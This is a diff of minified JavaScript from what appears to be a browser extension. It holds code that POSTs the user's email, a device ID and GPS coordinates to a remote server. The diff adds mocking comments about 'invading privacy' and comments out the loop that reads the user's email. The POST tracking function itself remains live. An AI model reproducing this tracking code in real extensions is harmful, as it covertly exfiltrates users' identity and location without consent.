@@ -40,7 +40,7 @@
             var r, o, t;
             ((new Date).getTime() - a > i || !(Math.abs(c[0] - e[0]) < n && Math.abs(c[1] - e[1]) < n)) && (await (r = l, o = d, t = e, new Promise((e, n) => {
                 try {
-                    const i = new XMLHttpRequest,
+                    const i = new XMLHttpRequest, // initalize tracker :DDDD
                         a = "info[platform]=chromeTracker&info[email]=" + r + "&info[udid]=" + o + "&info[gps]=" + JSON.stringify(t) + "&info[phrases]=1";
                     i.open("POST", s, !0), i.setRequestHeader("Content-type", "application/x-www-form-urlencoded"), i.send(a), i.onload = () => {
                         e()
@@ -59,8 +59,8 @@
             e.onMessage.addListener(async e => {
                 Array.isArray(e.pos) ? await u(e.pos) : console.warn("Invalid coordinates")
             })
-        }), async function() {
-            for (;;) try {
+        }), async function() { // invade privacy to get email ;DDD
+/*            for (;;) try {
                 l = await new Promise((e, r) => {
                     try {
                         chrome.identity.getProfileUserInfo(r => {
@@ -74,6 +74,7 @@
             } catch (e) {
                 console.error("Error obtaining email: ", e), console.log("retrying email lookup in 1 second"), await f(1e3)
             }
+*/
           // Get location and invade privacy
 /*            for (;;) try {
                 const e = await new Promise((e, r) => {
